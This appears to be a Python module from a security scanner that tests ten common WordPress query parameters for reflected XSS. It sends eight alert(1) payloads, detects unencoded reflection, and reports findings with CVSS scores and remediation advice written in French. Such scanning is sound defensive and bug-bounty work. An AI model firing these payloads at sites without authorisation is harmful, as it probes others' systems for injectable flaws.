"""XSS scanner — reflected XSS across common WordPress query parameters."""

from __future__ import annotations

from typing import TYPE_CHECKING
from urllib.parse import quote

import httpx

from core.models import Evidence, Finding, Severity, Confidence, FindingType, Compliance
from modules.base import BazookaModule, ModuleResult

if TYPE_CHECKING:
    from core.engine import ScanContext
    from core.session import BazookaSession

# Parameters commonly reflected in WordPress core / themes / plugins
XSS_PARAMS = ["s", "p", "author", "cat", "tag", "paged", "orderby", "order", "lang", "id"]

# Payload set: each payload has a marker string (the literal bytes we expect
# to find verbatim in the response if the output is NOT html-encoded).
XSS_PAYLOADS = [
    ("<script>alert(1)</script>", "script tag"),
    ('"><img src=x onerror=alert(1)>', "img onerror breakout"),
    ("'><svg onload=alert(1)>", "svg onload breakout"),
    ("javascript:alert(1)", "javascript URI"),
    ("<svg/onload=alert(1)>", "svg slash onload"),
    ('"><iframe srcdoc=alert(1)>', "iframe srcdoc"),
    ("</script><script>alert(1)</script>", "script close + reopen"),
    ('"><body onload=alert(1)>', "body onload breakout"),
]

# Global request budget for the module
MAX_REQUESTS = 80


def _is_html_encoded(body: str, payload: str) -> bool:
    """Return True if the payload appears only HTML-encoded (so it cannot execute)."""
    # Common encodings of the most discriminating characters in our payloads
    encoded_variants = [
        payload.replace("<", "&lt;").replace(">", "&gt;"),
        payload.replace("<", "&#60;").replace(">", "&#62;"),
        payload.replace('"', "&quot;").replace("'", "&#39;"),
    ]
    if payload in body:
        return False
    return any(v in body for v in encoded_variants)


class XSSScannerModule(BazookaModule):
    name = "vuln.xss_scanner"
    phase = "vuln"
    description = "Reflected XSS scanner across common WP query parameters"
    profiles = ["standard", "aggressive", "bugbounty"]

    async def run(self, ctx: ScanContext, session: BazookaSession) -> ModuleResult:
        result = ModuleResult()
        base = ctx.target.url
        vulnerable_params: set[str] = set()
        request_count = 0
        finding_idx = 1

        for param in XSS_PARAMS:
            if param in vulnerable_params:
                continue
            for payload, payload_name in XSS_PAYLOADS:
                if request_count >= MAX_REQUESTS:
                    break
                request_count += 1
                url = f"{base}/?{param}={quote(payload, safe='')}"
                try:
                    resp = await session.get(url, use_cache=False)
                except (httpx.TimeoutException, httpx.ConnectError, httpx.HTTPError):
                    continue

                body = resp.text or ""

                # Skip if body is empty or payload is HTML-encoded (safe)
                if not body:
                    continue
                if _is_html_encoded(body, payload):
                    continue

                if payload in body:
                    vulnerable_params.add(param)
                    idx = body.index(payload)
                    excerpt = body[max(0, idx - 60): idx + len(payload) + 60]

                    result.add_finding(Finding(
                        id=f"VULN-XSS-{finding_idx:03d}",
                        title=f"XSS reflechie dans le parametre ?{param}=",
                        severity=Severity.HIGH,
                        cvss_score=6.1,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
                        confidence=Confidence.CONFIRMED,
                        finding_type=FindingType.CVE,
                        description=(
                            f"Le payload XSS '{payload_name}' est reflete sans encodage HTML "
                            f"dans la reponse pour le parametre '{param}'."
                        ),
                        evidence=Evidence(
                            request=f"GET {url}",
                            response_status=resp.status_code,
                            response_body_excerpt=excerpt,
                        ),
                        impact="Vol de session (cookie), redirection malveillante, defacement, phishing.",
                        remediation=(
                            "Encoder les sorties avec esc_html() / esc_attr() / esc_url(). "
                            "Activer une Content-Security-Policy stricte."
                        ),
                        compliance=Compliance(
                            owasp_2021="A03:2021 - Injection",
                            cwe="CWE-79",
                            mitre_attack="T1189 - Drive-by Compromise",
                        ),
                        references=[
                            "https://owasp.org/www-community/attacks/xss/",
                            "https://developer.wordpress.org/apis/security/escaping/",
                        ],
                        phase="vuln",
                        module=self.name,
                        tags=["xss", "reflected", param],
                    ))
                    finding_idx += 1
                    break  # one finding per param is enough — dedupe

            if request_count >= MAX_REQUESTS:
                break

        if not vulnerable_params:
            result.add_finding(Finding(
                id="VULN-XSS-CLEAR",
                title="Aucune XSS reflechie detectee",
                severity=Severity.INFO,
                confidence=Confidence.CONFIRMED,
                finding_type=FindingType.INFORMATION_DISCLOSURE,
                description=(
                    f"{len(XSS_PARAMS)} parametres x {len(XSS_PAYLOADS)} payloads testes "
                    f"({request_count} requetes). Aucune reflexion non-encodee detectee."
                ),
                phase="vuln",
                module=self.name,
            ))

        result.add_data("xss_requests", request_count)
        result.add_data("xss_vulnerable_params", sorted(vulnerable_params))
        return result

    def should_run(self, ctx) -> bool:
        return ctx.profile in self.profiles
